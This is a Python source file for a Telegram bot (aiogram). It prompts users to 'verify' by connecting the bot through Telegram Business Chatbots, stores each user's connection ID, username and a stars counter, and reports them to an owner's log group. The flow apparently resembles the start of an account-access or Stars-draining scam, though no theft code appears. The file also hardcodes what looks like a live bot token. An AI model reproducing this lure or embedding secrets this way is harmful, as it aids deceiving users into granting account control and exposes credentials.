import asyncio
import logging
from aiogram import Bot, Dispatcher, F
from aiogram.enums import ParseMode
from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.methods.get_business_connection import GetBusinessConnection
from aiogram.exceptions import TelegramBadRequest
from aiogram.handlers import business_connection

API_TOKEN = "8120657679:AAGqf3YCJML6HmgObyOXz8cdcfDX6dY1STw"
LOG_GROUP_ID = -1002710995756
OWNER_ID = 7072373613

# Dictionary to track connected users
authorized = {}

logging.basicConfig(level=logging.INFO)

bot = Bot(token=API_TOKEN)
dp = Dispatcher()

# /start command
@dp.message(F.text == "/start")
async def start_cmd(message: Message):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="✅ Verify Business Connection", callback_data="verify_bc")]
    ])
    await message.reply("Welcome! Tap below to verify your Business connection:", reply_markup=kb)

# Button press to verify user is connected via Business
@dp.callback_query(F.data == "verify_bc")
async def verify_cb(callback: CallbackQuery):
    bc_id = getattr(callback.message, "business_connection_id", None)
    if not bc_id:
        return await callback.answer("🔴 You are not connected via Business Chatbots.", show_alert=True)

    try:
        info = await bot(GetBusinessConnection(business_connection_id=bc_id))
        uid = info.user.id
        username = f"@{info.user.username}" if info.user.username else info.user.first_name

        authorized[uid] = {
            "connection_id": bc_id,
            "username": username,
            "stars": 0,
            "notified": False
        }

        await bot.send_message(
            LOG_GROUP_ID,
            f"✅ <a href='tg://user?id={uid}'>{username}</a> verified via button.",
            parse_mode=ParseMode.HTML
        )

        await callback.message.edit_text("🟢 Verified! You're connected to Business Chatbots.")
    except TelegramBadRequest as e:
        await callback.answer(f"Error: {e.message}", show_alert=True)

# When user connects the bot from Business Chatbots
@dp.business_connection()
async def on_business_connect(bc):  # `bc` is already the BusinessConnection object
    try:
        info = await bot(GetBusinessConnection(business_connection_id=bc.id))
        uid = info.user.id
        username = f"@{info.user.username}" if info.user.username else info.user.first_name

        authorized[uid] = {
            "connection_id": bc.id,
            "username": username,
            "stars": 0,
            "notified": False
        }

        await bot.send_message(
            LOG_GROUP_ID,
            f"🤖 <a href='tg://user?id={uid}'>{username}</a> added the bot via Business Chatbots.",
            parse_mode=ParseMode.HTML
        )
    except Exception as e:
        logging.error(f"Business connection error: {e}")

# Start polling
async def main():
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
